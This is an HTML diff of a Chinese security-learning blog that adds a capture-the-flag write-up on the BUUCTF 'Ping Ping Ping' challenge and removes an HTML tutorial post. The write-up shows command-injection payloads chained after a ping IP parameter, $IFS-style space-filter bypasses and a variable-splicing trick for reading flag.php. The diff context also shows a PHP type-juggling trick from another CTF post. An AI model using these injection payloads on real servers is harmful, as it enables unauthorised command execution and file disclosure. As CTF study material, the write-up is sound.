@@ -277,6 +277,108 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-ping" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/01/19/ping/" class="article-date">
+      <time datetime="2021-01-19T11:06:17.000Z" itemprop="datePublished">2021-01-19</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/01/19/ping/">5-buu练习Ping Ping Ping</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>打开题目，界面如下<br><img src="/2021/01/19/ping/ping1.png"><br>结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：</p>
+<ul>
+<li>?/ip=127.0.0.1
+</li></ul>
+发现ping通过了！
+
+<p><img src="/2021/01/19/ping/ping2.png"></p>
+<p>接下来管道符ls来查看目录文件名称：</p>
+<ul>
+<li>url + /?ip=127.0.0.1|ls
+</li></ul>
+
+<p><img src="/2021/01/19/ping/ping3.png"></p>
+<p>查看flag.php文件内容： url + /?ip=127.0.0.1|cat flag.php<br>但是并没有出现flag，而是以下界面</p>
+<p><img src="/2021/01/19/ping/ping4.png"></p>
+<p>应该是空格键被过滤掉了<br>过滤空格键的解决办法：将空格替换成“$IFS$1”，（“$1”里的“1”可以是任意数字）：</p>
+<ul>
+<li>url + /?ip=127.0.0.1|cat$IFS$1flag.php
+</li></ul>
+
+<p><img src="/2021/01/19/ping/ping5.png"></p>
+<p>发现flag被过滤了，那么只好查看index.php文件</p>
+<ul>
+<li>url + /?ip=127.0.0.1|cat$IFS$1index.php
+</li></ul>
+文件内容如下：
+
+<p><img src="/2021/01/19/ping/ping6.png"></p>
+<p>发现过滤了好多字符，但是在最后看到了a变量，那么就可以将a的值覆盖掉，来进行绕过</p>
+<ul>
+<li>url + /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
+</li></ul>
+查看源代码得到flag！
+
+<p><img src="/2021/01/19/ping/ping7.png"></p>
+<p>————————————<br>盘点一下学到的知识点吧！<br>1、$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格；<br>2、可以解决空格问题的方法：</p>
+<ul>
+<li>{cat,flag.txt}
+</li><li>cat${IFS}flag.txt
+</li><li>cat$IFS$9flag.txt
+</li><li>cat<flag.txt <li>cat<>flag.txt
+<br>这些是linux下巧妙越过空格的方法;
+<br>下面是windows下绕过空格的方法，实用性不强，就type这个命令可以用
+<li>type.\flag.txt
+</li><li>type,flag.txt </li></flag.txt></li></ul>
+<br>（又是被摧残的一天giao！！！）
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-bu" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -918,73 +1020,6 @@ resource=upload.php，代表读取upload.php的内容
 <p>1、if(is_numeric($b)){<br>2、    exit();<br>3、}<br>4、if($b&gt;1234){<br>5、    echo $flag2;<br>6、}<br>   对于b的话，我们可以给他传1235a，这样b就不是数字串了，而1235a会自动转换成1235再去和1234来比较为true。<br>   <img src="/2020/11/30/bugku/php2.png"><br>   dingdong!成功得到flag！<br>   注：<br>    松散比较：使用两个等号 == 比较，只比较值，不比较类型。<br>    严格比较：用三个等号 === 比较，除了比较值，也比较类型。</p>
 <p>  yiya又是被摧残的一天，拜嘞个拜~</p>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-html" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2020/11/28/html/" class="article-date">
-      <time datetime="2020-11-28T10:38:55.000Z" itemprop="datePublished">2020-11-28</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2020/11/28/html/">Html</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>HTML 标题<br>HTML 标题（Heading）是通过 h1 标签来定义的。<br><img src="/2020/11/28/html/html%E6%A0%87%E9%A2%98.png"><br>HTML 段落<br>HTML 段落是通过标签 p 来定义的。<br><img src="/2020/11/28/html/html%E6%AE%B5%E8%90%BD.png"><br>HTML 链接<br>HTML 链接是通过标签 a 来定义的。<br><img src="/2020/11/28/html/html%E9%93%BE%E6%8E%A5.png"><br>提示:在 href=链接的地址，后面的文字是代替链接的文字。<br>HTML 图像<br>HTML 图像是通过标签 img 来定义的.<br><img src="/2020/11/28/html/html%E5%9B%BE%E5%83%8F.png"><br>提示： 图像的名称和尺寸是以属性的形式提供的。<br>       定义图像的语法是：<br>       《img src=”url” /》（使用英文字符，url可以是路径也可以是链接）<br>       具体内容详见（<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/html/html_images.asp%EF%BC%89">https://www.w3school.com.cn/html/html_images.asp）</a></p>
-<h2>插入本地图片方法</h2>
-<h5>绝对路径</h5>
-比如，你的图片存放在D盘images目录里，名称是img.png。那么绝对路径应该是这样：D:\images\img.png。
-<h5>相对路径</h5>
-如果，你的html文件存放的位置跟图片一样，那么就直接表达：img.png。
-<h5>子路径</h5>
-那如果，你的html文件存放在D盘里，那么就是子路径了：images/img.png。
-<h5>父路径</h5>
-html文件存放在D盘里的images文件里的css文件中，那么就使用父路径了：../img.png，当然了，也可以../../images/img.png。<p></p>
-（又是沉迷学习的一天~）
       
     </div>
     
